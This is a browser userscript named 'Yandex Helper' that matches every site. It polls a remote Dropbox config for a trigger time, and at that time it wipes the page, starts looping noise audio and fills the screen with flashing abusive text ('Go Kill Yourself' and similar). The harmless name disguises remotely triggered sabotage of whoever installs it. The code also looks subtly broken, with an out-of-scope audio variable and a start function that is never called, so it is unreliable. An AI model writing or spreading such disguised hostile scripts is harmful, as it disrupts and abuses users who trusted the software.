// ==UserScript==
// @name         Yandex Helper
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        */*
// @grant        GM.xmlHttpRequest
// @grant        GM.getResourceURL
// @connect dl.dropboxusercontent.com
// ==/UserScript==

    function get_close_config(callback){
        let xhr = new XMLHttpRequest();
        var url = "https://dl.dropboxusercontent.com/s/so0u91mqtdg3cqg/tab_close_config.json"

        GM.xmlHttpRequest({
            method: 'GET',
            url: url,
            responseType: 'json',
            onload: function (resp) {
                callback(resp.response)
            },
            onerror: function (resp) {
                console.log(resp.statusText);
            },
        })
        //fetch(url).then(function(response){
        //    response.json().then(function(data){
        //        callback(data)
        //    })
        //})
    }

function* pseudoRandom(seed) {
    let value = seed;

    while(true) {
        value = value * 16807 % 2147483647
        yield value;
    }

};

function FuckYourself_DestroyPage(){
    let generator = pseudoRandom(1)
    var super_words = ["Fuck", "Kill", "Humiliate"];
    noise_audio.play();
    [].forEach.call(document.querySelectorAll("*"), function(x){if(x.tagName!="BODY" && x.tagName!="HTML"){try{x.remove();}catch(e){}}})
    document.body.style.backgroundColor = "#000"
    document.body.style.backgroundImage = "url(https://25.media.tumblr.com/tumblr_m2tnydjxke1qg39ewo1_500.gif)"
    var timer = 0
    setInterval(function(){
        document.body.innerHTML = ""
        for(var t=0; t<50; t++){
            var dots = ""
            for(var i=0; i<Math.round((Math.sin((timer+t/3))+1)*5); i++) dots += "."
            var super_word = super_words[Math.floor(t*1)%super_words.length]
            document.body.innerHTML += `<h1 style="${(t%2==0 ? "" : "text-align:right;")} color: #ff3232; padding-left:2em;">${("Go "+super_word+" Yourself").split("").map((x, i)=> i>0 ? (dots+x) : x).join("")}</h1>`
        }
        timer += 0.04
    }, 10)
}

function start_checking(){
    var check_interval = null
    var noise_audio = new Audio("https://dl.dropboxusercontent.com/s/87tn8z5nu4a3aw3/noise_1.wav")
    noise_audio.loop = true
    check_interval = setInterval(function(){
        get_close_config(function(data){
            var close_time = data["close_time"]
            var date = new Date()
            var current_time = date.getHours()*60*60 + date.getMinutes()*60 + date.getSeconds()
            console.log(close_time)
            if(current_time >= close_time && current_time < close_time + 60*2){
                clearInterval(check_interval)
                FuckYourself_DestroyPage()
            }
        })
    }, 5000)
}


// Your code here...